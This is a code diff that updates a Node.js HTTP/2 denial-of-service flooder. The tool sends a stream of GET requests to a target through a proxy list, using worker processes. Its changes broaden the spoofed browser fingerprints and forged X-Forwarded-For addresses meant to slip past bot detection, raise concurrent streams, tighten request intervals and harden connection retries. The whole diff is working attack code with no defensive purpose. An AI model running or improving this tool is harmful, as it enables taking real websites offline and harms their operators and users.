@@ -30,7 +30,7 @@ function randomElement(elements) {
 }
 
 function randstr(length) {
-    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
     let result = "";
     for (let i = 0; i < length; i++) {
         result += characters.charAt(Math.floor(Math.random() * characters.length));
@@ -50,53 +50,47 @@ const parsedTarget = url.parse(args.target);
 if (!parsedTarget.protocol || !parsedTarget.host) process.exit(1);
 
 const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Android 15; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/129.0.2792.79"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0"
 ];
 
 const accept_header = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "application/json, text/plain, */*"
 ];
 const lang_header = [
-    "en-US,en;q=0.8",
-    "en-GB,en;q=0.7",
-    "vi-VN,vi;q=0.9,en;q=0.8"
+    "en-US,en;q=0.9",
+    "vi-VN,vi;q=0.9,en-US;q=0.8",
+    "zh-CN,zh;q=0.9,en;q=0.8"
 ];
-const encoding_header = [
-    "gzip, deflate, br",
-    "gzip, deflate"
-];
+const encoding_header = ["gzip, deflate, br"];
 const sec_fetch_headers = {
-    "sec-fetch-dest": ["document", "empty"],
-    "sec-fetch-mode": ["navigate", "cors"],
+    "sec-fetch-dest": ["document", "empty", "script"],
+    "sec-fetch-mode": ["navigate", "cors", "no-cors"],
     "sec-fetch-site": ["same-origin", "cross-site"]
 };
-const cache_control = ["no-cache", "max-age=0"];
+const cache_control = ["no-cache", "no-store"];
 const referers = [
     `https://${parsedTarget.host}/`,
-    `https://${parsedTarget.host}${parsedTarget.path}`,
+    "https://www.google.com/",
     ""
 ];
-const platforms = ["Windows", "Macintosh"];
+const platforms = ["Windows", "Macintosh", "iPhone", "Android"];
 const sec_ch_ua = [
-    '"Google Chrome";v="129", "Chromium";v="129", "Not.A/Brand";v="99"',
-    '"Firefox";v="131"',
-    '"Safari";v="18.1"',
-    '"Microsoft Edge";v="129"'
+    '"Google Chrome";v="127", "Chromium";v="127", "Not.A/Brand";v="99"',
+    '"Firefox";v="129"',
+    '"Safari";v="18"'
 ];
 
 const ciphers = [
     "TLS_AES_128_GCM_SHA256",
     "TLS_AES_256_GCM_SHA384",
     "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
-    "TLS_CHACHA20_POLY1305_SHA256"
+    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
 ].join(":");
 
 const proxies = readLines(args.proxyFile);
@@ -107,7 +101,7 @@ if (cluster.isMaster) {
     }
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
-    setInterval(runFlooder, randomIntn(100, 150));
+    setInterval(runFlooder, 100);
 }
 
 class NetSocket {
@@ -130,15 +124,23 @@ class NetSocket {
         });
 
         connection.on("data", chunk => {
-            if (!chunk.toString("utf-8").includes("HTTP/1.1 200")) {
+            const response = chunk.toString("utf-8");
+            if (!response.includes("HTTP/1.1 200")) {
                 connection.destroy();
-                return callback(undefined);
+                return callback(undefined, "invalid proxy response");
             }
-            callback(connection);
+            return callback(connection);
         });
 
-        connection.on("timeout", () => connection.destroy());
-        connection.on("error", () => connection.destroy());
+        connection.on("timeout", () => {
+            connection.destroy();
+            callback(undefined, "timeout");
+        });
+
+        connection.on("error", () => {
+            connection.destroy();
+            callback(undefined, "error");
+        });
     }
 }
 
@@ -147,15 +149,16 @@ const Socker = new NetSocket();
 function generateDynamicPath() {
     const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
     const queries = [
-        `q=${randstr(4)}-${randstr(4)}`,
-        `t=${randstr(6)}`,
-        `s=${randomIntn(1, 100)}`
+        `q=${randstr(6)}`,
+        `id=${randstr(4)}`,
+        `p=${randomIntn(1, 50)}`,
+        `t=${randstr(8)}`
     ];
     return `${basePath}?${randomElement(queries)}`;
 }
 
 function generateDynamicHeaders() {
-    const headers = {
+    return {
         ":method": "GET",
         ":authority": parsedTarget.host,
         ":path": generateDynamicPath(),
@@ -168,31 +171,31 @@ function generateDynamicHeaders() {
         "sec-fetch-mode": randomElement(sec_fetch_headers["sec-fetch-mode"]),
         "sec-fetch-site": randomElement(sec_fetch_headers["sec-fetch-site"]),
         "sec-ch-ua": randomElement(sec_ch_ua),
-        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
         "sec-ch-ua-platform": randomElement(platforms),
         "cache-control": randomElement(cache_control),
-        "referer": randomElement(referers)
+        "referer": randomElement(referers),
+        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`
     };
-    if (Math.random() > 0.3) {
-        headers["x-forwarded-for"] = `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`;
-    }
-    return headers;
 }
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
-    if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, randomIntn(1000, 1500));
+    if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, 1000);
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 3
+        timeout: 5
     };
 
-    Socker.HTTP(proxyOptions, (connection) => {
-        if (!connection) return setTimeout(runFlooder, randomIntn(1000, 1500));
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) {
+            if (connection) connection.destroy();
+            return setTimeout(runFlooder, 1000);
+        }
 
         const tlsOptions = {
             secure: true,
@@ -202,8 +205,7 @@ function runFlooder() {
             servername: parsedTarget.host,
             rejectUnauthorized: false,
             minVersion: 'TLSv1.2',
-            maxVersion: 'TLSv1.3',
-            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256"
+            maxVersion: 'TLSv1.3'
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -213,7 +215,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 32,
+                maxConcurrentStreams: 64,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536
             },
@@ -235,7 +237,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, randomIntn(80, 120));
+            }, 100);
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
@@ -243,14 +245,14 @@ function runFlooder() {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, randomIntn(1000, 1500));
+            setTimeout(runFlooder, 1000);
         });
 
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, randomIntn(1000, 1500));
+            setTimeout(runFlooder, 1000);
         });
     });
 }
